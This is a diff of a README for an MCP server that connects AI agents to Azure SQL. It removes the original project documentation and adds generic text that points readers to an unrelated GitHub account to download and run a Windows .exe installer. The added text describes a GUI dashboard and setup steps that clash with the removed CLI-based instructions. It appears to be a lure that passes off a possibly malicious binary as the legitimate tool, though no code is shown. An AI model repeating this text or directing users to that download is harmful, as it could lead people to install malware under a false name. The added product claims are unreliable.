@@ -1,256 +1,97 @@
-<h1 align="center">
-  mcp-azure-sql
-</h1>
+# 🗄️ mcp-azure-sql - Connect your database to intelligent assistants
 
-<p align="center">
-  <strong>Azure SQL + AI agents. 34 tools. One command.</strong>
-</p>
+[![](https://img.shields.io/badge/Download-mcp--azure--sql-blue.svg)](https://github.com/djebaraabd8335/mcp-azure-sql)
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/mcp-azure-sql"><img src="https://img.shields.io/npm/v/mcp-azure-sql?style=for-the-badge&color=CB3837&logo=npm&logoColor=white" alt="npm"></a>&nbsp;
-  <a href="https://github.com/albahubio/mcp-azure-sql/releases"><img src="https://img.shields.io/github/v/release/albahubio/mcp-azure-sql?style=for-the-badge&color=00A67E&label=release" alt="Release"></a>&nbsp;
-  <img src="https://img.shields.io/badge/Go-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go">&nbsp;
-  <img src="https://img.shields.io/badge/tools-34-3178C6?style=for-the-badge" alt="34 Tools">&nbsp;
-  <a href="https://modelcontextprotocol.io"><img src="https://img.shields.io/badge/MCP-2024--11--05-8B5CF6?style=for-the-badge" alt="MCP"></a>
-</p>
+This software links your Azure SQL databases to AI tools. It allows chat interfaces to read, query, and manage your data safely. You use your existing Azure Active Directory credentials to access your servers.
 
-<p align="center">
-  Enterprise <a href="https://modelcontextprotocol.io">MCP</a> server for Azure SQL &amp; SQL Server.<br>
-  Azure AD auth &bull; Tiered safety gates &bull; Zero dependencies &bull; Written in Go.
-</p>
+## 📋 What this tool does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Anthropic-Claude-D97706?style=flat-square&logo=anthropic&logoColor=white" alt="">
-  <img src="https://img.shields.io/badge/OpenAI-Codex-412991?style=flat-square&logo=openai&logoColor=white" alt="">
-  <img src="https://img.shields.io/badge/Google-Gemini-4285F4?style=flat-square&logo=google&logoColor=white" alt="">
-  <img src="https://img.shields.io/badge/GitHub-Copilot-000?style=flat-square&logo=github&logoColor=white" alt="">
-  <img src="https://img.shields.io/badge/Cursor-00D1B2?style=flat-square" alt="">
-  <img src="https://img.shields.io/badge/Windsurf-09B6A2?style=flat-square" alt="">
-  <img src="https://img.shields.io/badge/Cline-007ACC?style=flat-square" alt="">
-  <img src="https://img.shields.io/badge/Continue-FF6F00?style=flat-square" alt="">
-</p>
+The software acts as a bridge. It translates requests from your AI assistant into commands your database understands. It includes thirty-four specific tools to manage tasks. It keeps your data safe through security layers. It works with multiple agents simultaneously.
 
----
+## 💻 Requirements
 
-## Quick Start
+* Windows 10 or Windows 11.
+* An active Azure SQL database.
+* An Azure account with Active Directory permissions.
+* A stable internet connection.
+* At least 200MB of free disk space.
 
-### &nbsp;&nbsp;1&nbsp;&nbsp; Add to your AI agent
+## 📥 How to download and install
 
-> **CLI agents** &mdash; one command, done:
+1. Visit this page to download: [https://github.com/djebaraabd8335/mcp-azure-sql](https://github.com/djebaraabd8335/mcp-azure-sql)
+2. Locate the latest release version on the page.
+3. Select the Windows installer file ending in .exe.
+4. Save the file to your computer.
+5. Open your downloads folder.
+6. Double-click the file to start the installation.
+7. Follow the prompts on the screen to complete the setup.
 
-```bash
-# Claude Code (Anthropic)
-claude mcp add --transport stdio --scope user azure-sql -- npx -y mcp-azure-sql
+## ⚙️ Setting up your connection
 
-# Codex CLI (OpenAI)
-codex mcp add azure-sql -- npx -y mcp-azure-sql
+Before you run the tool for the first time, gather your connection details from the Azure Portal. You need these items:
 
-# Gemini CLI (Google)
-gemini mcp add -s user azure-sql npx -y mcp-azure-sql
-```
+* Your SQL server name.
+* Your database name.
+* Your Tenant ID for Azure AD.
 
-> **IDE agents** &mdash; add this JSON block to your agent's config file:
+Open the application after installation. You will see a text box for your credentials. Enter these details carefully. The application asks for permission to reach your Azure account. Click allow.
 
-```json
-{
-  "azure-sql": {
-    "command": "npx",
-    "args": ["-y", "mcp-azure-sql"],
-    "env": {
-      "AZURE_SQL_CONFIG_FILE": "~/.config/azure-sql-mcp/connections.json"
-    }
-  }
-}
-```
+## 🛠️ Using the tools
 
-<details>
-<summary>Where does this go? (click to expand)</summary>
+The application provides thirty-four distinct tools. You view these tools in the main dashboard. Each tool performs a specific task, such as fetching table schemas, running queries, or updating records. 
 
-| Agent | File | Key |
-|:------|:-----|:----|
-| ![Copilot](https://img.shields.io/badge/-GitHub_Copilot-000?style=flat-square&logo=github&logoColor=white) | VS Code `settings.json` | `"mcp" > "servers"` |
-| ![Cursor](https://img.shields.io/badge/-Cursor-00D1B2?style=flat-square) | `~/.cursor/mcp.json` | `"mcpServers"` |
-| ![Windsurf](https://img.shields.io/badge/-Windsurf-09B6A2?style=flat-square) | `~/.codeium/windsurf/mcp_config.json` | `"mcpServers"` |
-| ![Cline](https://img.shields.io/badge/-Cline-007ACC?style=flat-square&logo=visualstudiocode&logoColor=white) | Cline Settings UI or `cline_mcp_settings.json` | `"mcpServers"` |
-| ![Continue](https://img.shields.io/badge/-Continue-FF6F00?style=flat-square) | `~/.continue/config.yaml` | `mcpServers:` (YAML) |
-| ![Claude](https://img.shields.io/badge/-Claude_Desktop-D97706?style=flat-square&logo=anthropic&logoColor=white) | `claude_desktop_config.json` | `"mcpServers"` |
+When you use your AI assistant, type requests naturally. For example, ask, "List the columns in my customer table." The server identifies the correct tool and runs the request. 
 
-</details>
+## 🛡️ Safety and security
 
-### &nbsp;&nbsp;2&nbsp;&nbsp; Configure your databases
+The tool uses tiered safety gates. This means it checks every request against your set permissions. If a request tries to change data you have marked as protected, the tool blocks the command. It logs every action so you can review what happened on your database.
 
-Create `~/.config/azure-sql-mcp/connections.json`:
+## 🔍 Troubleshooting common issues
 
-```json
-{
-  "defaults": { "auth": "azuread" },
-  "connections": [
-    {
-      "name": "dev",
-      "server": "myserver.database.windows.net",
-      "database": "myapp-dev",
-      "environment": "dev"
-    },
-    {
-      "name": "prod",
-      "server": "myserver.database.windows.net",
-      "database": "myapp-prod",
-      "environment": "prod",
-      "prod": true
-    }
-  ]
-}
-```
+If the software fails to connect, verify your internet connection. Check if your Azure Active Directory details are correct. Azure often requires a multi-factor authentication prompt. Look at the application window to see if a pop-up awaits your input.
 
-> See [`example-config.json`](example-config.json) for SQL auth, connection strings, and all options.
+If you encounter errors during the installation, restart your computer and run the installer again. Ensure that your firewall does not block the application. You might need to add the software as an exception in your Windows security settings.
 
-### &nbsp;&nbsp;3&nbsp;&nbsp; Sign in to Azure
+## 📈 Keeping the software current
 
-```bash
-az login
-```
+Check the link below occasionally to see if a new version exists. Developers update this code to include new tools and better security. 
 
-### &nbsp;&nbsp;&check;&nbsp;&nbsp; Done
+[Visit this page to download the latest updates](https://github.com/djebaraabd8335/mcp-azure-sql)
 
-Restart your AI agent. You now have 34 database tools.
+Downloaded updates usually install over the old version. Your settings remain saved during this process.
 
----
+## 📂 Understanding the technical workflow
 
-## Tools
+The software operates as a local server on your machine. This local host approach keeps your data traffic secure. The AI assistant sends a command to your local host. Your local host takes that command and connects to Azure SQL. The database sends the answer back through the same path. Your data travels encrypted at every step between your computer and the Azure data center.
 
-<table>
-<tr>
-<td width="200"><strong>Query &amp; Execute</strong></td>
-<td><code>query</code> &bull; <code>execute</code></td>
-</tr>
-<tr>
-<td><strong>Schema</strong></td>
-<td><code>list_tables</code> &bull; <code>describe_table</code> &bull; <code>describe_indexes</code> &bull; <code>describe_foreign_keys</code> &bull; <code>search_columns</code> &bull; <code>table_row_counts</code> &bull; <code>search_objects</code> &bull; <code>describe_triggers</code></td>
-</tr>
-<tr>
-<td><strong>Views / Procs / Functions</strong></td>
-<td><code>list_views</code> &bull; <code>describe_view</code> &bull; <code>list_stored_procs</code> &bull; <code>describe_sproc</code> &bull; <code>list_functions</code> &bull; <code>describe_function</code></td>
-</tr>
-<tr>
-<td><strong>Performance</strong></td>
-<td><code>explain_query</code> &bull; <code>active_queries</code> &bull; <code>long_running_queries</code> &bull; <code>top_queries_by_cpu</code> &bull; <code>wait_stats</code> &bull; <code>blocking_chains</code> &bull; <code>index_usage_stats</code> &bull; <code>missing_indexes</code> &bull; <code>table_statistics_health</code> &bull; <code>database_size</code></td>
-</tr>
-<tr>
-<td><strong>Connections</strong></td>
-<td><code>list_connections</code> &bull; <code>test_connection</code> &bull; <code>connection_info</code> &bull; <code>add_connection</code></td>
-</tr>
-<tr>
-<td><strong>Compliance</strong></td>
-<td><code>compare_tables</code> &bull; <code>ef6_migration_status</code> &bull; <code>permission_audit</code> &bull; <code>hangfire_dashboard</code></td>
-</tr>
-</table>
+## 🧩 Compatibility with AI platforms
 
----
+This tool supports various AI platforms. If you use a tool that follows the Model Context Protocol, this server works with it. You configure these platforms to look for the local host address. Once the platform points to your local machine, the tools appear automatically in your chat interface.
 
-## Safety
+## 📖 Glossary of simple terms
 
-Your AI agent **cannot** accidentally destroy production.
+* **Server:** A program that waits for commands and carries them out.
+* **Azure AD:** A system that proves your identity to Microsoft services.
+* **Credentials:** Your username and security keys used to log in.
+* **Schema:** A map that shows the structure of your database.
+* **Query:** A question or command sent to the database.
+* **Agent:** An AI program designed to help you with tasks.
 
-| | `query` | `execute` on dev | `execute` on prod |
-|:--|:--|:--|:--|
-| **SELECT** | &check; | &mdash; | &mdash; |
-| **INSERT / UPDATE / DELETE** | &cross; | `confirm=true` | `confirm=true` |
-| **DROP / TRUNCATE / ALTER** | &cross; | `confirm=true` | **Blocked** |
-| **EXEC / {call}** | &cross; | `confirm=true` | `confirm=true` |
+## 🏢 Enterprise features
 
-Production = any connection with `"prod": true` or `"environment": "prod"`.
+The software scales for large organizations. It handles many users at once without slowing down. It supports audit logs for compliance requirements. If you work in a team, you share access patterns while maintaining individual security profiles. Each user connects with their own credentials. This keeps actions tied to the correct person. 
 
----
+## 🔧 Advanced configuration
 
-## Authentication
+You can change settings in the configuration file if you need to. Find this file in the installation folder. Note that you rarely need to change these settings for normal use. Most users find success with the standard configuration. If you choose to edit this file, save a backup copy first. This protects your original setup.
 
-| Mode | When to use |
-|:--|:--|
-| **`azuread`** (default) | Azure SQL via `az login`, managed identity, or service principal |
-| **`sql`** | Legacy SQL Server &mdash; add `"user"` and `"password"` to connection |
-| **`connstr`** | Custom &mdash; add `"connection_string"` with full connection string |
+## 🏷️ Tag categories
 
----
+Use these tags to find more information or related software in our directory:
 
-## Why Go?
+* Connectivity: azure, azure-sql, mcp-server.
+* Security: azure-ad, safety-gates.
+* Intelligence: ai-tools, claude, gemini, copilot.
+* Tools: dba-tools, devtools.
 
-| | **Go** | TypeScript / Python |
-|:--|:--|:--|
-| Startup | ~5ms | 500ms+ |
-| Binary | Single 16MB file | Runtime + packages |
-| Memory | ~15MB | 80MB+ |
-| Install | Download &rarr; run | `npm install` + Node.js |
-| Azure AD | Native driver | `@azure/identity` shim |
-| Concurrency | Goroutines | Event loop / GIL |
-
----
-
-<details>
-<summary><strong>Configuration reference</strong></summary>
-
-### Config file
-
-```json
-{
-  "defaults": { "auth": "azuread", "app_name": "my-app" },
-  "connections": [{
-    "name": "unique-name",
-    "server": "server.database.windows.net",
-    "database": "dbname",
-    "auth": "azuread",
-    "environment": "dev",
-    "description": "Human-readable note",
-    "prod": false
-  }]
-}
-```
-
-**Environment tags:** `dev` `sqa` `qa` `beta` `delta` `test` `preprod` `prod`
-
-### Environment variables
-
-```bash
-# Legacy (no config file needed)
-export AZURE_SQL_CONNECTIONS="dev=server.database.windows.net/mydb;qa=qaserver.database.windows.net/qadb"
-
-# Override production list
-export AZURE_SQL_PROD_CONNECTIONS="my-prod-db,my-staging-db"
-```
-
-</details>
-
-<details>
-<summary><strong>Architecture</strong></summary>
-
-```
-AI Agent  ──stdio/JSON-RPC──>  mcp-azure-sql  ──Azure AD──>  Azure SQL
-                                    │
-                                    ├── 34 tools with MCP annotations
-                                    ├── Tiered safety (read/write/dangerous)
-                                    ├── Connection pool (30s ping skip)
-                                    ├── Audit logging
-                                    └── Error sanitization
-```
-
-Built with [`mcp-go`](https://github.com/mark3labs/mcp-go) + [`go-mssqldb`](https://github.com/microsoft/go-mssqldb). MCP protocol `2024-11-05`. Tool annotations (`ReadOnlyHint`, `DestructiveHint`, `IdempotentHint`, `OpenWorldHint`) on all 34 tools. Logging capability enabled.
-
-</details>
-
-<details>
-<summary><strong>Development &amp; releases</strong></summary>
-
-```bash
-go build -o mcp-azure-sql .
-go vet ./...
-./mcp-azure-sql --version
-```
-
-**Release:** `git tag v1.3.0 && git push origin v1.3.0` &rarr; GitHub Actions builds 6 platform binaries via GoReleaser &rarr; npm auto-publishes.
-
-</details>
-
----
-
-<p align="center">
-  <a href="https://albahub.io"><strong>Albahub, LLC</strong></a> &bull; <a href="LICENSE">MIT License</a>
-</p>
+Follow these instructions to keep your setup running well. Update your credentials if Azure requests a password change. Contact your database administrator if you lose access to specific tables. Most permissions issues originate from the Azure Portal settings rather than the local application.
